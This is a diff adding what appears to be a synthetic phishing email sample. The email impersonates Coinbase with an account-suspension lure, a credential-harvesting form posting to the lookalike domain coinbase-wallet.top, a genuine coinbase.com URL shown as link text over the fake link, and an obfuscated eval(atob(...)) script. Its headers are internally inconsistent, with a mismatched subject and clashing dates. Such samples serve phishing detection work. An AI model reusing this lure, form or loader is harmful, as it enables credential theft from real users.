@@ -1,0 +1,30 @@
+From: notice@coinbase-wallet.top
+To: victim45@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 27 Mar 2002 13:27:00 -0500
+Message-ID: <phish-45-85a23081-1763-4bec-80ff-bbc821af9ac6@coinbase-wallet.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 07 Mar 2002 05:48:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 09 Mar 2002 09:05:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 04 Mar 2002 14:10:00 -0500
+Return-Path: <bounce@mail-aeb03fab.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-aeb03fab.top; dkim=fail header.d=coinbase-wallet.top; dmarc=fail header.from=coinbase-wallet.top
+Received-SPF: fail (mx.example.com: domain of notice@coinbase-wallet.top does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=coinbase-wallet.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-45-7034b039"
+
+--bnd-p-45-7034b039
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://coinbase-wallet.top/login
+
+Reference: PC0641D
+--bnd-p-45-7034b039
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://coinbase-wallet.top/login<br/><br/>Reference: PC0641D</p><p><a href="http://coinbase-wallet.top/login">https://www.coinbase.com/signin</a></p><form action="http://coinbase-wallet.top/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-45-7034b039--
